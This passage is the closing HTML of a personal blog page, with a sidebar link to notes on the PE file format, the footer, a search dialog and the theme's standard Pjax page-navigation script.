title="发表于 2022-11-10 13:43:27">2022-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）"><img src="https://picsum.photos/seed/blog-cover-02/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PE文件格式整理（2020年2月23日notability手写笔记）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）">PE文件格式整理（2020年2月23日notability手写笔记）</a><time datetime="2022-11-08T01:10:26.000Z" title="发表于 2022-11-08 09:10:26">2022-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2019 - 2026 By Cyberangel</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="/js/decode-copyright-url.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      true
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
